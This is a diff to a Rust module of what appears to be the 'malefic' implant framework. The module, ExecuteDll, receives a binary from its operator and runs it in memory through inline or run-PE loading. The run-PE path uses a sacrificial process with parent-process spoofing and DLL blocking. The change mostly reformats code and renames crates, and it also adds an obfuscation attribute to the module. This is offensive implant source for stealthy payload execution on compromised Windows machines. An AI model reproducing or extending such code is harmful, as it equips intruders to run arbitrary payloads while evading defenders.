@@ -1,11 +1,11 @@
 #![allow(unused_assignments)]
 use std::ptr::null;
 
-use malefic_helper::win::kit::pe::{inlinepe::inline_pe, runpe::run_pe};
-use malefic_helper::common::utils::format_cmdline;
-use malefic_proto::proto::modulepb::BinaryResponse;
 use crate::execute::Arch;
 use crate::prelude::*;
+use malefic_common::utils::format_cmdline;
+use malefic_os_win::kit::pe::{inlinepe::inline_pe, runpe::run_pe};
+use malefic_proto::proto::modulepb::BinaryResponse;
 
 pub struct ExecuteDll {}
 
@@ -14,9 +14,15 @@ pub struct ExecuteDll {}
 impl Module for ExecuteDll {}
 
 #[async_trait]
-impl malefic_proto::module::ModuleImpl for ExecuteDll {
-     #[allow(unused_variables)]
-    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, sender: &mut malefic_proto::module::Output) -> ModuleResult {
+#[obfuscate]
+impl malefic_module::ModuleImpl for ExecuteDll {
+    #[allow(unused_variables)]
+    async fn run(
+        &mut self,
+        id: u32,
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
+    ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let timeout = request.timeout;
         let delay = request.delay;
@@ -43,7 +49,8 @@ impl malefic_proto::module::ModuleImpl for ExecuteDll {
                     is_x86,
                     sacrifice.ppid,
                     sacrifice.block_dll,
-                    request.output);
+                    request.output,
+                );
             }
         } else {
             let cmdline = if request.args.is_empty() {
@@ -51,7 +58,7 @@ impl malefic_proto::module::ModuleImpl for ExecuteDll {
             } else {
                 format_cmdline(request.process_name, request.args)
             };
-            
+
             unsafe {
                 result = inline_pe(
                     request.bin.as_ptr() as _,
@@ -65,17 +72,19 @@ impl malefic_proto::module::ModuleImpl for ExecuteDll {
                     true,
                     need_output,
                     timeout,
-                    delay
+                    delay,
                 );
             }
         }
 
-        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
-            status: 0,
-            message: Vec::new(),
-            data: result,
-            err: "".to_string(),
-        })))
+        Ok(TaskResult::new_with_body(
+            id,
+            Body::BinaryResponse(BinaryResponse {
+                status: 0,
+                message: Vec::new(),
+                data: result,
+                err: "".to_string(),
+            }),
+        ))
     }
-
 }
